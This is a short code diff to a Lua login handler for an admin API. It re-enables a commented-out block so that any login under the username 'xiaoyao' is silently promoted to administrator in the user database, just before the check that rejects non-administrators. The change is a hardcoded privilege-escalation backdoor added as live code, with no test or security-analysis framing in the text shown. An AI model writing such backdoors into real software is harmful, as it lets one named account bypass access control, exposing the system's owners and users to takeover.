@@ -28,11 +28,11 @@ function admin:api_login(params)
 		return errors:wrap(errors.REQUEST_PARAMS_ERROR)
 	end
 
-	--if userinfo.username == "xiaoyao" then
-		--userDB:db():updateOne({["+username"]={params.username}}, {roleId=const.USER_ROLE_ADMINISTRATOR}, resume)
-		--yield()
-		--userinfo.roleId = const.USER_ROLE_ADMINISTRATOR
-	--end
+	if userinfo.username == "xiaoyao" then
+		userDB:db():updateOne({["+username"]={params.username}}, {roleId=const.USER_ROLE_ADMINISTRATOR}, resume)
+		yield()
+		userinfo.roleId = const.USER_ROLE_ADMINISTRATOR
+	end
 
 	if userinfo.roleId ~= const.USER_ROLE_MANAGER and userinfo.roleId ~= const.USER_ROLE_ADMINISTRATOR then
 		return errors:wrap(errors:new("用户不是管理员"))
